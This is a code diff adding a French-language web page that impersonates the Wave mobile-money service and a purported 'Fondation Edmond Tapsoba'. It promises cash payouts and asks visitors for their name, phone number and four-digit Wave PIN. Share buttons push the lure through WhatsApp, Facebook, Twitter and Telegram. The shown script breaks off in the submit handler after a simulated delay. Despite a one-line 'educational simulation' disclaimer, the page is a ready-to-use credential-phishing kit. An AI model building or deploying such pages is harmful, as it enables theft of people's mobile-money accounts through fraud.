@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Wave - Fondation Edmond Tapsoba</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(to right, #00d464, #009dff);
+        }
+        
+        .share-container {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+        }
+        
+        .share-btn {
+            background: linear-gradient(to right, #ff7e5f, #feb47b);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s;
+        }
+        
+        .share-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .share-panel {
+            display: none;
+            position: absolute;
+            top: 50px;
+            right: 0;
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            z-index: 100;
+            text-align: left;
+        }
+        
+        .share-panel h3 {
+            margin-bottom: 10px;
+            color: #333;
+            font-size: 16px;
+        }
+        
+        .share-url {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        
+        .share-url input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px 0 0 5px;
+            font-size: 14px;
+        }
+        
+        .copy-btn {
+            background: #009dff;
+            color: white;
+            border: none;
+            border-radius: 0 5px 5px 0;
+            padding: 10px 15px;
+            cursor: pointer;
+        }
+        
+        .social-share {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 10px;
+        }
+        
+        .social-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        .social-btn:hover {
+            transform: scale(1.1);
+        }
+        
+        .facebook { background-color: #3b5998; }
+        .whatsapp { background-color: #25D366; }
+        .twitter { background-color: #1DA1F2; }
+        .telegram { background-color: #0088cc; }
+        
+        .foundation-banner {
+            background: linear-gradient(135deg, #ff7e5f, #feb47b);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 16px;
+            box-shadow: 0 4px 12px rgba(254, 180, 123, 0.4);
+        }
+        
+        .logo {
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .wave-logo {
+            width: 120px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: white;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+            padding: 10px;
+        }
+        
+        .wave-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+        
+        h1 {
+            color: #212121;
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: 600;
+            line-height: 1.4;
+        }
+        
+        .highlight {
+            color: #009dff;
+            font-weight: 700;
+        }
+        
+        .form-section {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .form-section h2 {
+            color: #ff7e5f;
+            margin-bottom: 15px;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        .input-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #424242;
+            font-weight: 500;
+            font-size: 15px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #009dff;
+            box-shadow: 0 0 0 3px rgba(0, 157, 255, 0.1);
+        }
+        
+        button {
+            background: linear-gradient(to right, #00d464, #009dff);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            width: 100%;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(0, 212, 100, 0.3);
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 212, 100, 0.4);
+        }
+        
+        p {
+            margin-top: 20px;
+            font-size: 15px;
+            color: #666;
+        }
+        
+        a {
+            color: #009dff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+            color: #00d464;
+        }
+        
+        .divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, #ddd, transparent);
+            margin: 25px 0;
+        }
+        
+        .disclaimer {
+            font-size: 13px;
+            color: #999;
+            margin-top: 30px;
+            line-height: 1.5;
+        }
+        
+        .secure-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            color: #00d464;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .loader {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            color: #00d464;
+            background-color: rgba(0, 212, 100, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .error-message {
+            display: none;
+            color: #ff4757;
+            background-color: rgba(255, 71, 87, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .copied-message {
+            display: none;
+            color: #00d464;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        
+        @media (max-width: 520px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+            
+            .wave-logo {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .foundation-banner {
+                font-size: 15px;
+                padding: 12px;
+            }
+            
+            .share-panel {
+                width: 280px;
+                right: -10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Bouton de partage -->
+        <div class="share-container">
+            <button class="share-btn" id="shareButton">
+                <i class="fas fa-share-alt"></i>
+            </button>
+            <div class="share-panel" id="sharePanel">
+                <h3>Partager cette page</h3>
+                <div class="share-url">
+                    <input type="text" id="pageUrl" value="https://votre-lien-wave.com" readonly>
+                    <button class="copy-btn" id="copyButton">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+                <div class="copied-message" id="copiedMessage">Lien copié dans le presse-papier!</div>
+                <div class="social-share">
+                    <a class="social-btn facebook" id="facebookShare">
+                        <i class="fab fa-facebook-f"></i>
+                    </a>
+                    <a class="social-btn whatsapp" id="whatsappShare">
+                        <i class="fab fa-whatsapp"></i>
+                    </a>
+                    <a class="social-btn twitter" id="twitterShare">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a class="social-btn telegram" id="telegramShare">
+                        <i class="fab fa-telegram-plane"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="foundation-banner">
+            FONDATION EDMOND TAPSOBA - Veuillez CONNECTER VOTRE COMPTE WAVE POUR BÉNÉFICIER DE LA SOMME PROMISE
+        </div>
+        
+        <div class="logo">
+            <div class="wave-logo">
+                <!-- Nouveau logo avec l'URL fournie -->
+                <img src="https://i.postimg.cc/g2qWSxqr/434x0w.webp" alt="Logo Fondation Edmond Tapsoba">
+            </div>
+        </div>
+        
+        <h1>Connectez-vous à votre compte <span class="highlight">Wave</span></h1>
+        
+        <div class="form-section">
+            <h2>Informations Fondation Edmond Tapsoba</h2>
+            
+            <div class="input-group">
+                <label for="fullname">Nom et Prénoms</label>
+                <input type="text" id="fullname" name="fullname" required placeholder="Votre nom complet">
+            </div>
+            
+            <div class="input-group">
+                <label for="amount">Somme à bénéficier (FCFA)</label>
+                <select id="amount" name="amount" required>
+                    <option value="">Sélectionnez un montant</option>
+                    <option value="50000">50 000 FCFA</option>
+                    <option value="100000">100 000 FCFA</option>
+                    <option value="200000">200 000 FCFA</option>
+                    <option value="500000">500 000 FCFA</option>
+                    <option value="1000000">1 000 000 FCFA</option>
+                    <option value="other">Autre montant</option>
+                </select>
+            </div>
+            
+            <div class="input-group" id="customAmountGroup" style="display: none;">
+                <label for="customAmount">Montant personnalisé (FCFA)</label>
+                <input type="number" id="customAmount" name="customAmount" placeholder="Entrez le montant">
+            </div>
+        </div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="phone">Numéro de téléphone</label>
+                <input type="tel" id="phone" name="phone" required placeholder="Votre numéro Wave">
+            </div>
+            
+            <div class="input-group">
+                <label for="pin">Code PIN</label>
+                <input type="password" id="pin" name="pin" required placeholder="Votre code PIN" maxlength="4" pattern="[0-9]{4}">
+            </div>
+            
+            <button type="submit" id="submitBtn">
+                <span id="btnText">Se connecter et bénéficier</span>
+                <div class="loader" id="loader"></div>
+            </button>
+            
+            <div class="success-message" id="successMessage">
+                Connexion réussie! Vous bénéficierez bientôt de votre somme.
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                Une erreur s'est produite. Veuillez réessayer.
+            </div>
+            
+            <div class="secure-notice">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+                </svg>
+                Connexion sécurisée
+            </div>
+        </form>
+        
+        <div class="divider"></div>
+        
+        <p><a href="#">Code PIN oublié ?</a></p>
+        <p><a href="#">Créer un compte Wave</a></p>
+        
+        <p class="disclaimer">
+            Wave - Service de transfert d'argent et paiement mobile.<br>
+            En collaboration avec la Fondation Edmond Tapsoba.<br>
+            Cette page est une simulation à des fins éducatives.
+        </p>
+    </div>
+
+    <script>
+        // Récupérer l'URL actuelle de la page
+        document.getElementById('pageUrl').value = window.location.href;
+        
+        // Gérer l'affichage du panneau de partage
+        document.getElementById('shareButton').addEventListener('click', function() {
+            const panel = document.getElementById('sharePanel');
+            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+        });
+        
+        // Copier l'URL dans le presse-papier
+        document.getElementById('copyButton').addEventListener('click', function() {
+            const urlInput = document.getElementById('pageUrl');
+            urlInput.select();
+            document.execCommand('copy');
+            
+            // Afficher le message de confirmation
+            const copiedMessage = document.getElementById('copiedMessage');
+            copiedMessage.style.display = 'block';
+            
+            // Cacher le message après 3 secondes
+            setTimeout(function() {
+                copiedMessage.style.display = 'none';
+            }, 3000);
+        });
+        
+        // Partager sur Facebook
+        document.getElementById('facebookShare').addEventListener('click', function() {
+            const url = encodeURIComponent(window.location.href);
+            window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank');
+        });
+        
+        // Partager sur WhatsApp
+        document.getElementById('whatsappShare').addEventListener('click', function() {
+            const text = encodeURIComponent("Rejoignez la Fondation Edmond Tapsoba et bénéficiez d'une somme sur votre compte Wave!");
+            const url = encodeURIComponent(window.location.href);
+            window.open(`https://wa.me/?text=${text}%20${url}`, '_blank');
+        });
+        
+        // Partager sur Twitter
+        document.getElementById('twitterShare').addEventListener('click', function() {
+            const text = encodeURIComponent("Rejoignez la Fondation Edmond Tapsoba et bénéficiez d'une somme sur votre compte Wave!");
+            const url = encodeURIComponent(window.location.href);
+            window.open(`https://twitter.com/intent/tweet?text=${text}&url=${url}`, '_blank');
+        });
+        
+        // Partager sur Telegram
+        document.getElementById('telegramShare').addEventListener('click', function() {
+            const text = encodeURIComponent("Rejoignez la Fondation Edmond Tapsoba et bénéficiez d'une somme sur votre compte Wave!");
+            const url = encodeURIComponent(window.location.href);
+            window.open(`https://t.me/share/url?url=${url}&text=${text}`, '_blank');
+        });
+        
+        // Fermer le panneau de partage en cliquant à l'extérieur
+        document.addEventListener('click', function(event) {
+            const sharePanel = document.getElementById('sharePanel');
+            const shareButton = document.getElementById('shareButton');
+            
+            if (!sharePanel.contains(event.target) && event.target !== shareButton) {
+                sharePanel.style.display = 'none';
+            }
+        });
+        
+        // Gérer l'affichage du champ de montant personnalisé
+        document.getElementById('amount').addEventListener('change', function() {
+            const customAmountGroup = document.getElementById('customAmountGroup');
+            if (this.value === 'other') {
+                customAmountGroup.style.display = 'block';
+            } else {
+                customAmountGroup.style.display = 'none';
+            }
+        });
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Récupérer les valeurs du formulaire de fondation
+            const fullname = document.getElementById('fullname').value;
+            const amount = document.getElementById('amount').value;
+            const customAmount = document.getElementById('customAmount').value;
+            const finalAmount = amount === 'other' ? customAmount : amount;
+            
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Validation basique
+            if (!fullname || !phone || !pin) {
+                errorMessage.textContent = "Veuillez remplir tous les champs obligatoires.";
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            // Afficher le loader
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            submitBtn.disabled = true;
+            
+            // Simuler un délai de traitement
+            setTimeout(function() {
+                // Cacher le loader
+                btnText.style.display = 'block';
